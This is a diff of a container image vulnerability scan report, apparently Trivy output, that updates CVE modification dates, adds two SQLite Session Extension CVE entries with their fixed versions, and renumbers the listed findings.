@@ -126,7 +126,7 @@
 │                        │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                        │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                        │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
 │                        ├ [2]  ╭ VulnerabilityID : CVE-2026-33150 
 │                        │      ├ PkgID           : fuse3@3.18.2-1 
 │                        │      ├ PkgName         : fuse3 
@@ -512,7 +512,7 @@
 │                        │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                        │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                        │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
 │                        ├ [8]  ╭ VulnerabilityID : CVE-2026-4046 
 │                        │      ├ PkgID           : libc-bin@2.43-2ubuntu2 
 │                        │      ├ PkgName         : libc-bin 
@@ -1954,7 +1954,7 @@
 │                        │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                        │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                        │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
 │                        ├ [32] ╭ VulnerabilityID : CVE-2026-40228 
 │                        │      ├ PkgID           : libnss-systemd@259.5-0ubuntu3 
 │                        │      ├ PkgName         : libnss-systemd 
@@ -2214,8 +2214,87 @@
 │                        │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                        │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                        │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
-│                        ├ [37] ╭ VulnerabilityID : CVE-2024-56433 
+│                        │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
+│                        ├ [37] ╭ VulnerabilityID : CVE-2026-50812 
+│                        │      ├ PkgID           : libsqlite3-0@3.46.1-9ubuntu0.1 
+│                        │      ├ PkgName         : libsqlite3-0 
+│                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/libsqlite3-0@3.46.1-9ubuntu0.1?arch=a
+│                        │      │                  │       md64&distro=ubuntu-26.04 
+│                        │      │                  ╰ UID : 658677f661dbc54d 
+│                        │      ├ InstalledVersion: 3.46.1-9ubuntu0.1 
+│                        │      ├ FixedVersion    : 3.46.1-9ubuntu0.2 
+│                        │      ├ Status          : fixed 
+│                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                        │      │                  │         197d9e39c5494d4581e40 
+│                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                        │      │                            df117adb7086d939b6bf5 
+│                        │      ├ SeveritySource  : ubuntu 
+│                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-50812 
+│                        │      ├ DataSource       ╭ ID  : ubuntu 
+│                        │      │                  ├ Name: Ubuntu CVE Tracker 
+│                        │      │                  ╰ URL : https://git.launchpad.net/ubuntu-cve-tracker 
+│                        │      ├ Fingerprint     : sha256:682166e4df78feb3431b7a523fe3c47c10ab0b25dff5f4cca49b
+│                        │      │                   cd7be8749f67 
+│                        │      ├ Title           : A NULL pointer dereference in the SQLite Session Extension
+│                        │      │                   in SQLite 3 ... 
+│                        │      ├ Description     : A NULL pointer dereference in the SQLite Session Extension
+│                        │      │                   in SQLite 3.53.1 and SQLite trunk builds before check-in
+│                        │      │                   e807d4e3798efd53 allows an attacker who can supply a
+│                        │      │                   malformed changeset blob to cause a denial of service. The
+│                        │      │                   issue occurs when sqlite3changeset_apply_v3() applies a
+│                        │      │                   corrupt changeset and reaches sqlite3_value_type() with a
+│                        │      │                   NULL sqlite3_value pointer. 
+│                        │      ├ Severity        : MEDIUM 
+│                        │      ├ CweIDs           ─ [0]: CWE-476 
+│                        │      ├ VendorSeverity   ─ ubuntu: 2 
+│                        │      ├ References       ╭ [0]: https://gist.github.com/junius-sec/bb556f333957c5226d
+│                        │      │                  │      ede314db0e9e91 
+│                        │      │                  ├ [1]: https://github.com/sqlite/sqlite/commit/b869ed6b067d6
+│                        │      │                  │      23cb1383549f2a18aa35508385d 
+│                        │      │                  ├ [2]: https://sqlite.org/src/info/e807d4e3798efd53 
+│                        │      │                  ├ [3]: https://ubuntu.com/security/notices/USN-8565-1 
+│                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-50812 
+│                        │      ├ PublishedDate   : 2026-07-08T18:16:32.4Z 
+│                        │      ╰ LastModifiedDate: 2026-07-09T19:48:15.277Z 
+│                        ├ [38] ╭ VulnerabilityID : CVE-2026-50813 
+│                        │      ├ PkgID           : libsqlite3-0@3.46.1-9ubuntu0.1 
+│                        │      ├ PkgName         : libsqlite3-0 
+│                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/libsqlite3-0@3.46.1-9ubuntu0.1?arch=a
+│                        │      │                  │       md64&distro=ubuntu-26.04 
+│                        │      │                  ╰ UID : 658677f661dbc54d 
+│                        │      ├ InstalledVersion: 3.46.1-9ubuntu0.1 
+│                        │      ├ FixedVersion    : 3.46.1-9ubuntu0.2 
+│                        │      ├ Status          : fixed 
+│                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                        │      │                  │         197d9e39c5494d4581e40 
+│                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                        │      │                            df117adb7086d939b6bf5 
+│                        │      ├ SeveritySource  : ubuntu 
+│                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-50813 
+│                        │      ├ DataSource       ╭ ID  : ubuntu 
+│                        │      │                  ├ Name: Ubuntu CVE Tracker 
+│                        │      │                  ╰ URL : https://git.launchpad.net/ubuntu-cve-tracker 
+│                        │      ├ Fingerprint     : sha256:895a72fec131aa872efa4aae50cf9c1e1673153dedaa113005f5
+│                        │      │                   a9cf5dd265fe 
+│                        │      ├ Title           : An issue in SQLite before Fossil check-in 869a51ae84df
+│                        │      │                   allows a local  ... 
+│                        │      ├ Description     : An issue in SQLite before Fossil check-in 869a51ae84df
+│                        │      │                   allows a local attacker to obtain sensitive information via
+│                        │      │                    the Session Extension changeset concat/changegroup merge
+│                        │      │                   path 
+│                        │      ├ Severity        : MEDIUM 
+│                        │      ├ CweIDs           ─ [0]: CWE-126 
+│                        │      ├ VendorSeverity   ─ ubuntu: 2 
+│                        │      ├ References       ╭ [0]: https://gist.github.com/junius-sec/f8acb66bafb80134c8
+│                        │      │                  │      e1a1c8c7c9f4f4 
+│                        │      │                  ├ [1]: https://github.com/sqlite/sqlite/commit/c597ed79d1bd0
+│                        │      │                  │      3f57198d10d1f431adda293cf2e 
+│                        │      │                  ├ [2]: https://sqlite.org/src/info/869a51ae84df 
+│                        │      │                  ├ [3]: https://ubuntu.com/security/notices/USN-8565-1 
+│                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-50813 
+│                        │      ├ PublishedDate   : 2026-07-08T18:16:32.56Z 
+│                        │      ╰ LastModifiedDate: 2026-07-09T19:48:15.277Z 
+│                        ├ [39] ╭ VulnerabilityID : CVE-2024-56433 
 │                        │      ├ PkgID           : libsubid5@1:4.17.4-2ubuntu3 
 │                        │      ├ PkgName         : libsubid5 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/libsubid5@4.17.4-2ubuntu3?arch=amd64&
@@ -2278,7 +2357,7 @@
 │                        │      │                  ╰ [13]: https://www.cve.org/CVERecord?id=CVE-2024-56433 
 │                        │      ├ PublishedDate   : 2024-12-26T09:15:07.267Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T08:12:10.903Z 
-│                        ├ [38] ╭ VulnerabilityID : CVE-2026-40228 
+│                        ├ [40] ╭ VulnerabilityID : CVE-2026-40228 
 │                        │      ├ PkgID           : libsystemd-shared@259.5-0ubuntu3 
 │                        │      ├ PkgName         : libsystemd-shared 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/libsystemd-shared@259.5-0ubuntu3?arch
@@ -2322,7 +2401,7 @@
 │                        │      │                         8/1 
 │                        │      ├ PublishedDate   : 2026-04-10T16:16:33.753Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:44:53.31Z 
-│                        ├ [39] ╭ VulnerabilityID : CVE-2026-40228 
+│                        ├ [41] ╭ VulnerabilityID : CVE-2026-40228 
 │                        │      ├ PkgID           : libsystemd0@259.5-0ubuntu3 
 │                        │      ├ PkgName         : libsystemd0 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/libsystemd0@259.5-0ubuntu3?arch=amd64
@@ -2366,7 +2445,7 @@
 │                        │      │                         8/1 
 │                        │      ├ PublishedDate   : 2026-04-10T16:16:33.753Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:44:53.31Z 
-│                        ├ [40] ╭ VulnerabilityID : CVE-2026-40228 
+│                        ├ [42] ╭ VulnerabilityID : CVE-2026-40228 
 │                        │      ├ PkgID           : libudev1@259.5-0ubuntu3 
 │                        │      ├ PkgName         : libudev1 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/libudev1@259.5-0ubuntu3?arch=amd64&di
@@ -2410,7 +2489,7 @@
 │                        │      │                         8/1 
 │                        │      ├ PublishedDate   : 2026-04-10T16:16:33.753Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:44:53.31Z 
-│                        ├ [41] ╭ VulnerabilityID : CVE-2026-27456 
+│                        ├ [43] ╭ VulnerabilityID : CVE-2026-27456 
 │                        │      ├ PkgID           : libuuid1@2.41.3-3ubuntu2 
 │                        │      ├ PkgName         : libuuid1 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/libuuid1@2.41.3-3ubuntu2?arch=amd64&d
@@ -2484,7 +2563,7 @@
 │                        │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-27456 
 │                        │      ├ PublishedDate   : 2026-04-03T22:16:25.4Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:27:11.017Z 
-│                        ├ [42] ╭ VulnerabilityID : CVE-2026-3184 
+│                        ├ [44] ╭ VulnerabilityID : CVE-2026-3184 
 │                        │      ├ PkgID           : libuuid1@2.41.3-3ubuntu2 
 │                        │      ├ PkgName         : libuuid1 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/libuuid1@2.41.3-3ubuntu2?arch=amd64&d
@@ -2533,8 +2612,8 @@
 │                        │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                        │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                        │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
-│                        ├ [43] ╭ VulnerabilityID : CVE-2026-27456 
+│                        │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
+│                        ├ [45] ╭ VulnerabilityID : CVE-2026-27456 
 │                        │      ├ PkgID           : login@1:4.16.0-2+really2.41.3-3ubuntu2 
 │                        │      ├ PkgName         : login 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/login@4.16.0-2%2Breally2.41.3-3ubuntu
@@ -2608,7 +2687,7 @@
 │                        │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-27456 
 │                        │      ├ PublishedDate   : 2026-04-03T22:16:25.4Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:27:11.017Z 
-│                        ├ [44] ╭ VulnerabilityID : CVE-2026-3184 
+│                        ├ [46] ╭ VulnerabilityID : CVE-2026-3184 
 │                        │      ├ PkgID           : login@1:4.16.0-2+really2.41.3-3ubuntu2 
 │                        │      ├ PkgName         : login 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/login@4.16.0-2%2Breally2.41.3-3ubuntu
@@ -2657,8 +2736,8 @@
 │                        │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                        │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                        │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
-│                        ├ [45] ╭ VulnerabilityID : CVE-2024-56433 
+│                        │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
+│                        ├ [47] ╭ VulnerabilityID : CVE-2024-56433 
 │                        │      ├ PkgID           : login.defs@1:4.17.4-2ubuntu3 
 │                        │      ├ PkgName         : login.defs 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/login.defs@4.17.4-2ubuntu3?arch=all&d
@@ -2721,7 +2800,7 @@
 │                        │      │                  ╰ [13]: https://www.cve.org/CVERecord?id=CVE-2024-56433 
 │                        │      ├ PublishedDate   : 2024-12-26T09:15:07.267Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T08:12:10.903Z 
-│                        ├ [46] ╭ VulnerabilityID : CVE-2026-27456 
+│                        ├ [48] ╭ VulnerabilityID : CVE-2026-27456 
 │                        │      ├ PkgID           : mount@2.41.3-3ubuntu2 
 │                        │      ├ PkgName         : mount 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/mount@2.41.3-3ubuntu2?arch=amd64&dist
@@ -2795,7 +2874,7 @@
 │                        │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-27456 
 │                        │      ├ PublishedDate   : 2026-04-03T22:16:25.4Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:27:11.017Z 
-│                        ├ [47] ╭ VulnerabilityID : CVE-2026-3184 
+│                        ├ [49] ╭ VulnerabilityID : CVE-2026-3184 
 │                        │      ├ PkgID           : mount@2.41.3-3ubuntu2 
 │                        │      ├ PkgName         : mount 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/mount@2.41.3-3ubuntu2?arch=amd64&dist
@@ -2844,8 +2923,8 @@
 │                        │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                        │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                        │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
-│                        ├ [48] ╭ VulnerabilityID : CVE-2026-55655 
+│                        │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
+│                        ├ [50] ╭ VulnerabilityID : CVE-2026-55655 
 │                        │      ├ PkgID           : openssh-client@1:10.2p1-2ubuntu3.4 
 │                        │      ├ PkgName         : openssh-client 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/openssh-client@10.2p1-2ubuntu3.4?arch
@@ -2894,7 +2973,7 @@
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-55655 
 │                        │      ├ PublishedDate   : 2026-06-23T04:17:40.787Z 
 │                        │      ╰ LastModifiedDate: 2026-07-08T14:17:14.837Z 
-│                        ├ [49] ╭ VulnerabilityID : CVE-2026-55654 
+│                        ├ [51] ╭ VulnerabilityID : CVE-2026-55654 
 │                        │      ├ PkgID           : openssh-client@1:10.2p1-2ubuntu3.4 
 │                        │      ├ PkgName         : openssh-client 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/openssh-client@10.2p1-2ubuntu3.4?arch
@@ -2940,7 +3019,7 @@
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-55654 
 │                        │      ├ PublishedDate   : 2026-06-23T04:17:40.587Z 
 │                        │      ╰ LastModifiedDate: 2026-07-08T14:17:14.71Z 
-│                        ├ [50] ╭ VulnerabilityID : CVE-2026-55655 
+│                        ├ [52] ╭ VulnerabilityID : CVE-2026-55655 
 │                        │      ├ PkgID           : openssh-server@1:10.2p1-2ubuntu3.4 
 │                        │      ├ PkgName         : openssh-server 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/openssh-server@10.2p1-2ubuntu3.4?arch
@@ -2989,7 +3068,7 @@
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-55655 
 │                        │      ├ PublishedDate   : 2026-06-23T04:17:40.787Z 
 │                        │      ╰ LastModifiedDate: 2026-07-08T14:17:14.837Z 
-│                        ├ [51] ╭ VulnerabilityID : CVE-2026-55654 
+│                        ├ [53] ╭ VulnerabilityID : CVE-2026-55654 
 │                        │      ├ PkgID           : openssh-server@1:10.2p1-2ubuntu3.4 
 │                        │      ├ PkgName         : openssh-server 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/openssh-server@10.2p1-2ubuntu3.4?arch
@@ -3035,7 +3114,7 @@
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-55654 
 │                        │      ├ PublishedDate   : 2026-06-23T04:17:40.587Z 
 │                        │      ╰ LastModifiedDate: 2026-07-08T14:17:14.71Z 
-│                        ├ [52] ╭ VulnerabilityID : CVE-2026-55655 
+│                        ├ [54] ╭ VulnerabilityID : CVE-2026-55655 
 │                        │      ├ PkgID           : openssh-sftp-server@1:10.2p1-2ubuntu3.4 
 │                        │      ├ PkgName         : openssh-sftp-server 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/openssh-sftp-server@10.2p1-2ubuntu3.4
@@ -3084,7 +3163,7 @@
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-55655 
 │                        │      ├ PublishedDate   : 2026-06-23T04:17:40.787Z 
 │                        │      ╰ LastModifiedDate: 2026-07-08T14:17:14.837Z 
-│                        ├ [53] ╭ VulnerabilityID : CVE-2026-55654 
+│                        ├ [55] ╭ VulnerabilityID : CVE-2026-55654 
 │                        │      ├ PkgID           : openssh-sftp-server@1:10.2p1-2ubuntu3.4 
 │                        │      ├ PkgName         : openssh-sftp-server 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/openssh-sftp-server@10.2p1-2ubuntu3.4
@@ -3130,7 +3209,7 @@
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-55654 
 │                        │      ├ PublishedDate   : 2026-06-23T04:17:40.587Z 
 │                        │      ╰ LastModifiedDate: 2026-07-08T14:17:14.71Z 
-│                        ├ [54] ╭ VulnerabilityID : CVE-2024-56433 
+│                        ├ [56] ╭ VulnerabilityID : CVE-2024-56433 
 │                        │      ├ PkgID           : passwd@1:4.17.4-2ubuntu3 
 │                        │      ├ PkgName         : passwd 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/passwd@4.17.4-2ubuntu3?arch=amd64&dis
@@ -3193,7 +3272,7 @@
 │                        │      │                  ╰ [13]: https://www.cve.org/CVERecord?id=CVE-2024-56433 
 │                        │      ├ PublishedDate   : 2024-12-26T09:15:07.267Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T08:12:10.903Z 
-│                        ├ [55] ╭ VulnerabilityID : CVE-2018-6952 
+│                        ├ [57] ╭ VulnerabilityID : CVE-2018-6952 
 │                        │      ├ PkgID           : patch@2.8-2build1 
 │                        │      ├ PkgName         : patch 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/patch@2.8-2build1?arch=amd64&distro=u
@@ -3249,7 +3328,7 @@
 │                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2018-6952 
 │                        │      ├ PublishedDate   : 2018-02-13T19:29:00.573Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T02:02:30.21Z 
-│                        ├ [56] ╭ VulnerabilityID : CVE-2019-20633 
+│                        ├ [58] ╭ VulnerabilityID : CVE-2019-20633 
 │                        │      ├ PkgID           : patch@2.8-2build1 
 │                        │      ├ PkgName         : patch 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/patch@2.8-2build1?arch=amd64&distro=u
@@ -3299,7 +3378,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2019-20633 
 │                        │      ├ PublishedDate   : 2020-03-25T17:15:14.013Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T02:30:50.59Z 
-│                        ├ [57] ╭ VulnerabilityID : CVE-2021-45261 
+│                        ├ [59] ╭ VulnerabilityID : CVE-2021-45261 
 │                        │      ├ PkgID           : patch@2.8-2build1 
 │                        │      ├ PkgName         : patch 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/patch@2.8-2build1?arch=amd64&distro=u
@@ -3341,7 +3420,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2021-45261 
 │                        │      ├ PublishedDate   : 2021-12-22T18:15:08.1Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T04:13:14.107Z 
-│                        ├ [58] ╭ VulnerabilityID : CVE-2026-35341 
+│                        ├ [60] ╭ VulnerabilityID : CVE-2026-35341 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -3388,7 +3467,7 @@
 │                        │      │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-35341 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:36.06Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:25.5Z 
-│                        ├ [59] ╭ VulnerabilityID : CVE-2026-35344 
+│                        ├ [61] ╭ VulnerabilityID : CVE-2026-35344 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -3432,7 +3511,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-35344 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:36.49Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:25.833Z 
-│                        ├ [60] ╭ VulnerabilityID : CVE-2026-35345 
+│                        ├ [62] ╭ VulnerabilityID : CVE-2026-35345 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -3478,7 +3557,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-35345 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:36.627Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:25.943Z 
-│                        ├ [61] ╭ VulnerabilityID : CVE-2026-35348 
+│                        ├ [63] ╭ VulnerabilityID : CVE-2026-35348 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -3520,7 +3599,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-35348 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:37.04Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:26.27Z 
-│                        ├ [62] ╭ VulnerabilityID : CVE-2026-35350 
+│                        ├ [64] ╭ VulnerabilityID : CVE-2026-35350 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -3563,7 +3642,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-35350 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:37.327Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:26.48Z 
-│                        ├ [63] ╭ VulnerabilityID : CVE-2026-35351 
+│                        ├ [65] ╭ VulnerabilityID : CVE-2026-35351 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -3607,7 +3686,7 @@
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-35351 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:37.457Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:26.587Z 
-│                        ├ [64] ╭ VulnerabilityID : CVE-2026-35352 
+│                        ├ [66] ╭ VulnerabilityID : CVE-2026-35352 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -3653,7 +3732,7 @@
 │                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-35352 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:37.597Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:26.69Z 
-│                        ├ [65] ╭ VulnerabilityID : CVE-2026-35354 
+│                        ├ [67] ╭ VulnerabilityID : CVE-2026-35354 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -3697,7 +3776,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-35354 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:37.867Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:26.907Z 
-│                        ├ [66] ╭ VulnerabilityID : CVE-2026-35357 
+│                        ├ [68] ╭ VulnerabilityID : CVE-2026-35357 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -3740,7 +3819,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-35357 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:38.267Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:27.223Z 
-│                        ├ [67] ╭ VulnerabilityID : CVE-2026-35359 
+│                        ├ [69] ╭ VulnerabilityID : CVE-2026-35359 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -3785,7 +3864,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-35359 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:38.537Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:27.437Z 
-│                        ├ [68] ╭ VulnerabilityID : CVE-2026-35360 
+│                        ├ [70] ╭ VulnerabilityID : CVE-2026-35360 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -3827,7 +3906,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-35360 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:38.673Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:27.543Z 
-│                        ├ [69] ╭ VulnerabilityID : CVE-2026-35363 
+│                        ├ [71] ╭ VulnerabilityID : CVE-2026-35363 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -3874,7 +3953,7 @@
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-35363 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:39.12Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:27.867Z 
-│                        ├ [70] ╭ VulnerabilityID : CVE-2026-35364 
+│                        ├ [72] ╭ VulnerabilityID : CVE-2026-35364 
